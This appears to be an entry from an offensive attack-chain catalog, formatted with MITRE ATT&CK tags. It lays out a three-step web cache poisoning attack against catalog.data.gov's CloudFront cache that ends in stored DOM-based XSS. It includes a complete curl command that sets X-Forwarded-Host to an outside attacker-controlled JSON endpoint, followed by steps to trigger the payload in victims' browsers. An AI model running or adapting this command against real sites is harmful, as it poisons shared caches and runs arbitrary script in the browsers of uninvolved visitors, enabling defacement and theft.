---
id: ac-web-cache-poisoning-domxss-catalog
tags:
  - web-cache-poisoning
  - xss
  - dom-xss
  - cloudfront
  - javascript
  - aws
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - AWS
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Poison-CloudFront-Cache-with-Malicious-X-Forwarded-Host]]'
  - '[[procedures/Trigger-DOM-based-XSS-by-Visiting-Poisoned-Page]]'
  - '[[procedures/Execute-and-Verify-XSS-Payload]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:06:26.608Z'
description: >-
  A multi-stage attack exploiting unvalidated X-Forwarded-Host header to poison
  CloudFront cache, resulting in stored DOM-based XSS that executes arbitrary
  JavaScript on victim browsers.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Web Cache Poisoning via X-Forwarded-Host Leading to Stored DOM-based XSS on catalog.data.gov

Multi-stage attack chain demonstrating a complete attack workflow exploiting server trust in the X-Forwarded-Host header to poison the CloudFront cache, injecting malicious JSON that leads to DOM-based XSS execution on catalog.data.gov.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~2 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Cache Poisoning via X-Forwarded-Host] --> B[Trigger Exploit on Poisoned Page]
    B --> C[XSS Execution and Defacement]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Web platform with AWS CloudFront CDN
- Services: CloudFront caching
- Tech stack: JavaScript on client-side
- Network access: Public internet to catalog.data.gov

### Initial Access Requirements

- No credentials required
- Attacker must control a domain for hosting malicious JSON (e.g., portswigger-labs.net)
- Ability to send crafted HTTP requests

## Detailed Attack Procedures

### Step 1: Poison the CloudFront Cache
procedure: [[procedures/Poison-CloudFront-Cache-with-Malicious-X-Forwarded-Host]]

**Objective**: Inject a malicious X-Forwarded-Host header to alter the 'data-site-root' attribute in the response, poisoning the cache to serve unescaped JSON fetches from the attacker's domain.

**Instructions**: Use [[commands/curl-poison-cloudfront-cache]] to send a crafted GET request:

```bash
curl -i -s -k -X 'GET' -H 'Host: catalog.data.gov' -H 'Accept-Encoding: gzip, deflate' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H 'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H 'Connection: close' 'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null
```

**Expected Output**: No visible output due to redirection, but the CloudFront cache is poisoned for the target URL.

**Success Indicators**:
- Cache poisoning confirmed by subsequent requests returning altered 'data-site-root'
- Response includes injected attribute pointing to attacker's domain

### Step 2: Visit the Poisoned Page
procedure: [[procedures/Trigger-DOM-based-XSS-by-Visiting-Poisoned-Page]]

**Objective**: Load the poisoned page in a browser to trigger JavaScript that fetches and injects unescaped JSON from the malicious endpoint.

**Instructions**: Navigate to the target URL in a web browser: https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6. The client-side JavaScript will use the poisoned 'data-site-root' to fetch JSON.

**Expected Output**: Page loads with altered content; after a delay, malicious JSON is fetched and injected into the DOM.

**Success Indicators**:
- Page source shows 'data-site-root' set to attacker's domain
- Network tab reveals fetch to malicious JSON endpoint

### Step 3: Observe XSS Execution
procedure: [[procedures/Execute-and-Verify-XSS-Payload]]

**Objective**: Verify the DOM-based XSS by observing the execution of injected JavaScript, such as an alert popup demonstrating arbitrary code execution.

**Instructions**: Wait a few seconds after loading the page; the injected SVG onload event will trigger the payload.

**Expected Output**: Alert box pops up with 'catalog.data.gov', confirming XSS execution and potential for defacement or further exploits.

**Success Indicators**:
- Alert dialog appears in the browser
- Console logs or DOM inspection shows injected script execution

## Attack Chain Summary

### Key Achievements

1. Successful CloudFront cache poisoning via unvalidated X-Forwarded-Host
2. Triggering of stored DOM-based XSS affecting multiple users
3. Demonstration of arbitrary JavaScript execution leading to site defacement

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
